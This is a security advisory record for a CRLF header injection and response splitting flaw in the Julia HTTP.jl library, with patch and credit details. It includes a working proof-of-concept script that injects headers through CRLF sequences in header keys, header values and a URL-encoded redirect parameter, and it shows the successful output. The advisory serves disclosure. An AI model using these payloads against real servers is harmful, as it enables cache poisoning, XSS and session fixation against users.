```toml
schema_version = "1.7.3"
id = "JLSEC-0000-mnry2zx4x-1of3bis"
modified = 2025-10-14T02:22:26.433Z
aliases = ["GHSA-h3x8-ppwj-6vcj", "CVE-2025-61689"]

[[affected]]
pkg = "HTTP"
ranges = ["<= 1.10.17"]

[[jlsec_sources]]
id = "GHSA-h3x8-ppwj-6vcj"
imported = 2025-10-14T02:22:26.408Z
modified = 2025-10-10T12:51:29.000Z
published = 2025-10-10T12:51:29.000Z
url = "https://api.github.com/repos/JuliaWeb/HTTP.jl/security-advisories/GHSA-h3x8-ppwj-6vcj"
html_url = "https://github.com/JuliaWeb/HTTP.jl/security/advisories/GHSA-h3x8-ppwj-6vcj"
```

# Header injection/Response splitting via header construction.

HTTP.jl did not validate header names/values for illegal characters, allowing CRLF-based header injection and response splitting.

```
using HTTP, Sockets

function handle_index(req::HTTP.Request)
    @show HTTP.header(req, "X-Foo")
    return HTTP.Response(200, "ok")
end

function handle_redirect(req::HTTP.Request)
    return HTTP.Response(301, ["Location" => get(HTTP.URIs.queryparams(req), "to", "/")], "redirect")
end

const router = HTTP.Router()
HTTP.register!(router, "GET", "/", handle_index)
HTTP.register!(router, "GET", "/redirect", handle_redirect)

server = HTTP.serve!(router, Sockets.IPv4(0,0,0,0), 8080)


println("[*] POC 1: Header injection in request through header key")
user_input = "X-Custom: x\r\nX-Foo: Bar\r\nX-Custom"
HTTP.get("http://localhost:8080/", [user_input => "hello"])

println()

println("[*] POC 2: Header injection in request through header value")
user_input = "hello\r\nX-Foo: Bar"
HTTP.get("http://localhost:8080/", ["X-Custom" => user_input])

println()

println("[*] POC 3: Header injection in response through header value")
res = HTTP.get("http://localhost:8080/redirect?to=/%0d%0aX-Foo:%20Bar", redirect=false)
@show HTTP.header(res, "X-Foo")

```

_Result_

```
[ Info: Listening on: [0.0.0.0:8080](http://0.0.0.0:8080/), thread id: 1
[*] POC 1: Header injection in request through header key
HTTP.header(req, "X-Foo") = "Bar"

[*] POC 2: Header injection in request through header value
HTTP.header(req, "X-Foo") = "Bar"

[*] POC 3: Header injection in response through header value
HTTP.header(res, "X-Foo") = "Bar"
```

### Impact

This enables HTTP response splitting and header injection, leading to cache poisoning, XSS, session fixation, and more.

### Patches

This issue is fixed in HTTP.jl  `v1.10.19`

### Credit

Chen T

